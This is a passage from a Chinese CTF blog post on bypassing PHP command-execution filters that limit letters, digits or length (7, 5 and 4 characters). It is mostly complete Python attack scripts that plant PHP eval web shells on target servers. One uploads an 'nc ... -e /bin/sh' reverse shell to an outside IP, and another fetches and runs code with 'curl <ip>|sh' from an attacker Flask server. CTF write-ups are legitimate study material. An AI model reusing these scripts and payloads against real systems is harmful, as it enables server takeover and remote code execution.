<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">PHP_EXTRA_CONFIGURE_ARGS=--enable-fpm --with-fpm-user=www-data --with-fpm-group=www-data --disable-cgi<br>USER=www-data<br>HOSTNAME=f3f5c6c3e3ee<br>PHP_INI_DIR=/usr/local/etc/php<br>SHLVL=2<br>HOME=/home/www-data<br>PHP_LDFLAGS=-Wl,-O1 -pie<br>PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64<br>PHP_MD5=<br>PHP_VERSION=7.3.22<br>GPG_KEYS=CBAF69F173A0FEA4B537F470D66C9593118BCCB6 F38252826ACD957EF380D39F2F7956BC5DA04B5D<br>PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64<br>PHP_ASC_URL=https://www.php.net/distributions/php-7.3.22.tar.xz.asc<br>PHP_URL=https://www.php.net/distributions/php-7.3.22.tar.xz<br>PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br>PHPIZE_DEPS=autoconf 		dpkg-dev dpkg 		file 		g++ 		gcc 		libc-dev 		make 		pkgconf 		re2c<br>PWD=/var/www/html<br>PHP_SHA256=0e66606d3bdab5c2ae3f778136bfe8788e574913a3d8138695e54d98562f1fb5<br>FLAG=not_flag<br></code></pre></td></tr></table></figure>

<p>可以通过<code>$&#123;PHPIZE_DEPS:9:1&#125;</code>或者<code>$&#123;PHP_EXTRA_CONFIGURE_ARGS:12:1&#125;</code>表示空格</p>
<h3 id="无字母数字命令执行"><a href="#无字母数字命令执行" class="headerlink" title="无字母数字命令执行"></a>无字母数字命令执行</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]|[0-9]/i&quot;</span>,<span class="hljs-variable">$cmd</span>))&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>构造一个文件上传网页，强制上传，利用<code>?</code>匹配文件来rce</p>
<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://15763fb4-39d9-4a94-886d-313843ffdc96.challenges.ctfer.com:8080/?cmd=.%20/???/????????[@-[]&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span>/&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>抓包爆破，用<code>[@-[]</code>来匹配大写字母，可以增加读到的概率</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">POST /?cmd=.%20/???/????????[@-[] HTTP/1.1<br>Host: 15763fb4-39d9-4a94-886d-313843ffdc96.challenges.ctfer.com:8080<br>Content-Length: 421<br>Cache-Control: max-age=0<br>Upgrade-Insecure-Requests: 1<br>Origin: http://192.168.1.17<br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIoD8zFE5URcUFT3b<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Referer: http://192.168.1.17/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8<br>Connection: close<br><br>------WebKitFormBoundaryIoD8zFE5URcUFT3b<br>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.txt&quot;<br>Content-Type: text/html<br><br><br>whoami<br>------WebKitFormBoundaryIoD8zFE5URcUFT3b--<br><br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/wuzimushuzi1.png"></p>
<h3 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h3><h4 id="7字符长度的命令执行"><a href="#7字符长度的命令执行" class="headerlink" title="7字符长度的命令执行"></a>7字符长度的命令执行</h4><h5 id="web目录可写"><a href="#web目录可写" class="headerlink" title="web目录可写"></a>web目录可写</h5><p>可写的情况主要利用<code>&gt;</code>写入shell到文件名中，然后利用<code>ls -t</code>命令排序，写入文件后用<code>.</code>执行。具体思路如下</p>
<p>在<code>linux</code>中，可以利用<code>&gt;aa</code>创建一个文件，文件名就是<code>aa</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce7-1.png"></p>
<p>执行一次<code>ls -t&gt;0</code>，然后<code>cat 0</code>，会发现文件中按照创建文件的先后顺序进行了排序，那么如果将里面的内容替换成恶意的一句话木马，然后执行，不就能rce了吗</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce7-3.png"></p>
<p>为了避免符号的原因导致写入失败，先把一句话木马转成base64形式<br><code>&lt;?php eval($_GET[1]);</code></p>
<p><code>PD9waHAgZXZhbCgkX0dFVFsxXSk7</code></p>
<p><code>echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</code></p>
<p>然后对要执行的命令进行分割，不超过7个一组，注意每组后面加个<code>\</code>，在linux中表示一行未输入完</p>
<p>最后<code>0</code>文件中应该是如下内容</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce7-2.png"></p>
<p>执行<code>. 0</code>，就会生成一个<code>1.php</code></p>
<p>整合脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:01</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://75026f50-dfd3-4928-9a7c-c1d59c860cb3.challenge.ctf.show/&quot;</span><br><br>payload=[<br><span class="hljs-string">&quot;&gt;hp&quot;</span>,<br><span class="hljs-string">&quot;&gt;1.p\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;d\\&gt;\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;\\ -\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;e64\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;bas\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;7\\|\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;XSk\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;Fsx\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;dFV\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;kX0\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;bCg\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;XZh\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;AgZ\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;waH\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;PD9\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;o\\ \\&quot;</span>,<br><span class="hljs-string">&quot;&gt;ech\\&quot;</span>,<br><span class="hljs-string">&quot;ls -t&gt;0&quot;</span>,<br><span class="hljs-string">&quot;. 0&quot;</span><br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeFile</span>(<span class="hljs-params">payload</span>):<br>	data=&#123;<br>	<span class="hljs-string">&quot;cmd&quot;</span>:payload<br>	&#125;<br>	requests.post(url,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>	<span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payload:<br>		writeFile(p.strip())<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>		time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>	response = requests.get(url+<span class="hljs-string">&quot;1.php&quot;</span>)<br>	<span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="hljs-string">&quot;.1.php&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>	run()<br>	check()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	main()<br></code></pre></td></tr></table></figure>




<h5 id="web目录不可写"><a href="#web目录不可写" class="headerlink" title="web目录不可写"></a>web目录不可写</h5><p>既然当前目录不可写，那么可以利用可写的目录，比如php的临时文件存储目录<code>/tmp/</code></p>
<p>这样我们可以利用php的文件存储机制强行上传一个文件，内容是反弹shell的语句，然后利用<code>. /t*/*</code>匹配我们上传的文件并执行，刚好7个字符</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce7-4.png"></p>
<p>自动化脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:10</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://f1f8f51f-8da6-43cc-ab09-d5456cc2bcb7.challenge.ctf.show/&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getShell</span>(<span class="hljs-params">payload</span>):<br>	data=&#123;<br>	<span class="hljs-string">&quot;cmd&quot;</span>:payload<br>	&#125;<br>	file = &#123;<br>	<span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-string">b&quot;#!/bin/sh\nnc 43.154.107.226 3389 -e /bin/sh&quot;</span><br>	&#125;<br>	requests.post(url,data=data,files=file)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>	getShell(<span class="hljs-string">&quot;. /t*/*&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>	run()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	main()<br></code></pre></td></tr></table></figure>


<h4 id="5字符长度的命令执行"><a href="#5字符长度的命令执行" class="headerlink" title="5字符长度的命令执行"></a>5字符长度的命令执行</h4><h5 id="环境有dir"><a href="#环境有dir" class="headerlink" title="环境有dir"></a>环境有dir</h5><p>主要思路：<br>1：将<code>index.php</code>转为<code>.php</code><br>2：将临时文件打包到当前目录<br>3：使用php执行tar压缩包</p>
<p>第一步的操作与7字符可写差不多，主要是为了<code>index.php</code>这个文件名不影响后面的排序</p>
<p>先复制一份<code>index.php</code>的内容</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-1.png"></p>
<p>然后通过<code>cp</code>，<code>rev</code>，<code>dir</code>等命令将<code>index.php</code>转化为了<code>php.xedni</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-2.png"></p>
<p>先将多余的文件删除，再利用shell中的注释符<code>#</code>，成功得到<code>.php</code>文件</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-3.png"></p>
<p>删去多余的文件，创建<code>tar</code>命令和<code>vcf</code>参数</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-4.png"></p>
<p>强制上传一个文件到php的文件缓存目录<code>/tmp/xxxx</code>，内容是<code>&lt;?php file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;);?&gt;</code></p>
<p>然后最关键的命令来了，使用<code>* /t*</code>打包恶意文件到<code>z</code>，实际上执行的是<code>tar vcf z /tmp/*</code></p>
<p>最后使用<code>php z</code>命令写入shell</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-5.png"></p>
<p>自动化脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:17</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://78c1f836-ab24-4a5b-a22f-ce1494fe1b4c.challenge.ctf.show/&quot;</span><br>url_2 = url+<span class="hljs-string">&quot;.php&quot;</span><br>delay = <span class="hljs-number">1</span><br><br>chagneFile_payload=[<br><span class="hljs-string">&#x27;&gt;cp&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;k&#x27;</span>,<br><span class="hljs-string">&#x27;*&#x27;</span>,<br><span class="hljs-string">&#x27;rm cp&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;pc&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;dir&#x27;</span>,<br><span class="hljs-string">&#x27;*&gt;v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;rev&#x27;</span>,<br><span class="hljs-string">&#x27;*v&gt;z&#x27;</span>,<br><span class="hljs-string">&#x27;sh z&#x27;</span>,<br><span class="hljs-string">&#x27;rm v&#x27;</span>,<br><span class="hljs-string">&#x27;rm k&#x27;</span>,<br><span class="hljs-string">&#x27;rm z&#x27;</span>,<br><span class="hljs-string">&#x27;rm pc&#x27;</span>,<br><span class="hljs-string">&#x27;rm *v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;php.&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;j\\#&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;vm&#x27;</span>,<br><span class="hljs-string">&#x27;*&gt;v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;rev&#x27;</span>,<br><span class="hljs-string">&#x27;*v&gt;z&#x27;</span>,<br><span class="hljs-string">&#x27;sh z&#x27;</span><br>]<br><br>clearFile_payload=[<br><span class="hljs-string">&#x27;rm d*&#x27;</span>,<br><span class="hljs-string">&#x27;rm j*&#x27;</span>,<br><span class="hljs-string">&#x27;rm p*&#x27;</span>,<br><span class="hljs-string">&#x27;rm r*&#x27;</span>,<br><span class="hljs-string">&#x27;rm v*&#x27;</span>,<br><span class="hljs-string">&#x27;rm z&#x27;</span><br>]<br><br>shell_payload=[<br><span class="hljs-string">&#x27;&gt;tar&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;vcf&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;z&#x27;</span><br>]<br><br>file=&#123;<br>	<span class="hljs-string">&#x27;file&#x27;</span>:<span class="hljs-string">b&#x27;&lt;?php file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval(\\$_POST[1]);?&gt;&quot;);?&gt;&#x27;</span><br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">changeFile</span>():<br>	<span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> chagneFile_payload:<br>		sendPayload(url,p)<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>		time.sleep(delay)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">clearFile</span>():<br>	<span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> clearFile_payload:<br>		sendPayload(url_2,p)<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>		time.sleep(delay)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getshell</span>():<br>	<span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> shell_payload:<br>		sendPayload(url_2,p)<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>		time.sleep(delay)<br>	data=&#123;<br>		<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;* /t*&quot;</span><br>	&#125;<br>	requests.post(url_2,data=data,files=file)<br>	data=&#123;<br>		<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;php z&quot;</span><br>	&#125;<br>	requests.post(url_2,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkShell</span>():<br>	response = requests.get(url+<span class="hljs-string">&quot;1.php&quot;</span>)<br>	<span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="hljs-string">&quot;1.php&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sendPayload</span>(<span class="hljs-params">url,payload</span>):<br>	data=&#123;<br>	<span class="hljs-string">&quot;cmd&quot;</span>:payload<br>	&#125;<br>	requests.post(url,data=data)<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>	changeFile()<br>	clearFile()<br>	getshell()<br>	checkShell()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>	run()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	main()<br></code></pre></td></tr></table></figure>


<h5 id="环境无dir"><a href="#环境无dir" class="headerlink" title="环境无dir"></a>环境无dir</h5><p><code>dir</code>与<code>ls</code>最大的区别就是<code>dir</code>没有换行</p>
<p>这题主要思路是利用<code>grep</code>命令修改题目，可以说是非常巧妙了</p>
<p>具体步骤如下:</p>
<p>写入<code>grep</code>和<code>h</code>，接着<code>*</code>执行，实际上就是拿出题目中包含<code>h</code>的每一行，恰好<code>if(strlen($cmd) &lt;= 5)</code>是没有<code>h</code>的，这样就没有限制了</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-6.png"></p>
<p>将修改后的代码追加到<code>i</code>中</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-7.png"></p>
<p><code>cp</code>到<code>index.php</code>中</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce5-8.png"></p>
<p>整合脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:28</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://39fede4b-390d-42a1-b6c4-0924a2556b4e.challenge.ctf.show/&quot;</span><br><br>payload=[<br><span class="hljs-string">&quot;&gt;grep&quot;</span>,<br><span class="hljs-string">&quot;&gt;h&quot;</span>,<br><span class="hljs-string">&quot;*&gt;j&quot;</span>,<br><span class="hljs-string">&quot;rm g*&quot;</span>,<br><span class="hljs-string">&quot;rm h*&quot;</span>,<br><span class="hljs-string">&quot;&gt;cat&quot;</span>,<br><span class="hljs-string">&quot;*&gt;&gt;i&quot;</span>,<br><span class="hljs-string">&quot;rm c*&quot;</span>,<br><span class="hljs-string">&quot;rm j&quot;</span>,<br><span class="hljs-string">&quot;&gt;cp&quot;</span>,<br><span class="hljs-string">&quot;*&quot;</span><br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeFile</span>(<span class="hljs-params">payload</span>):<br>	data=&#123;<br>	<span class="hljs-string">&quot;cmd&quot;</span>:payload<br>	&#125;<br>	requests.post(url,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>	<span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payload:<br>		writeFile(p.strip())<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>		time.sleep(<span class="hljs-number">0.3</span>)<br>	<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>	run()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	main()<br></code></pre></td></tr></table></figure>


<h4 id="4字符长度的命令执行"><a href="#4字符长度的命令执行" class="headerlink" title="4字符长度的命令执行"></a>4字符长度的命令执行</h4><h5 id="环境有dir-1"><a href="#环境有dir-1" class="headerlink" title="环境有dir"></a>环境有dir</h5><p>主要思路和7字符可写差不多，拼接出<code>ls -t</code>命令到某个文件中，在按倒序写入写马的语句，依次执行即可。主要是注意文件顺序问题</p>
<p>自动化脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:42</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://eb893c73-86c3-449f-98fe-0f82d9212110.challenge.ctf.show/&quot;</span><br><br>payload = [<br><span class="hljs-string">&#x27;&gt;sl&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;kt-&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;j\\&gt;&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;j\\#&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;dir&#x27;</span>,<br><span class="hljs-string">&#x27;*&gt;v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;rev&#x27;</span>,<br><span class="hljs-string">&#x27;*v&gt;x&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;php&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;a.\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\&gt;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;-d\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;64\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;se\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ba\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\|\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;4=\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Pz\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;k7\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;XS\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;sx\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;VF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;dF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;X0\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;gk\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;bC\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Zh\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ZX\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Ag\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;aH\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;9w\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;PD\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;S&#125;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;IF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;&#123;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\$\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ho\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ec\\&#x27;</span>,<br><span class="hljs-string">&#x27;sh x&#x27;</span>,<br><span class="hljs-string">&#x27;sh j&#x27;</span><br>]<br><span class="hljs-comment">#&lt;?php eval($_GET[1]);?&gt;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeFile</span>(<span class="hljs-params">payload</span>):<br>	data=&#123;<br>	<span class="hljs-string">&quot;cmd&quot;</span>:payload<br>	&#125;<br>	requests.post(url,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>	<span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payload:<br>		writeFile(p.strip())<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>		time.sleep(<span class="hljs-number">0.3</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>	response = requests.get(url+<span class="hljs-string">&quot;a.php&quot;</span>)<br>	<span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="hljs-string">&quot;a.php&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>	run()<br>	check()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	main()<br></code></pre></td></tr></table></figure>

<h5 id="环境无dir，可写"><a href="#环境无dir，可写" class="headerlink" title="环境无dir，可写"></a>环境无dir，可写</h5><p>思路是通过<code>ls</code>，<code>mv</code>，<code>cat</code>构造出<code>ls -t&gt;a</code>，再<code>curl</code>写一句话</p>
<p>具体操作如下：</p>
<p>先将<code>ls -t&gt;a</code>写入<code>z</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce4-1.png"></p>
<p>倒序写入<code>curl 335708495|sh</code>，注意服务器的ip要先转int</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce4-2.png"></p>
<p>服务器上用<code>flask</code>写个<code>shell</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-string">&#x27;*************************&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">80</span>,debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>

<p>先执行<code>sh z</code>，即执行了<code>ls -t&gt;a</code>，即向<code>a</code>写入<code>curl 335708495|sh</code>，再<code>sh a</code>，就执行了<code>curl 335708495|sh</code>，并返回<code>echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</code>，成功写入<code>1.php</code></p>
<p>自动化脚本</p>
